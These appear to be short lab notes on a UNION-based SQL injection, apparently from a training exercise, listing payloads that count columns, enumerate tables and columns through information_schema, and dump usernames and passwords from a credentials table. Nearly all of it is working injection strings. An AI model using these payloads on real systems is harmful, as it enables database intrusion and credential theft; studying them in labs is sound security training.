    
    # find the number of columns 
    
    UNION SELECT NULL-- -    => ERROR!
    UNION SELECT NULL,NULL-- -  => no ERROR , so this DB.tables have 2 column 
    
    -- number of column = 2 
    
    
    # find the table name for credentials: 
    
    UNION SELECT NULL,table_name FROM information_schema.tables-- -
    
    -- and the name of table which I want is => users_kpagwb
    
    
    # find the columns of tables: 
    
    
    UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_kpagwb'-- -
    
    columns : username_vbivmx , password_ridwjl
    
    
    # Final query : 
    
    
    UNION SELECT username_vbivmx, password_ridwjl FROM users_kpagwb-- -
    
    
    UNION SELECT username_vbivmx, username_vbivmx||':'||password_ridwjl FROM users_kpagwb-- -
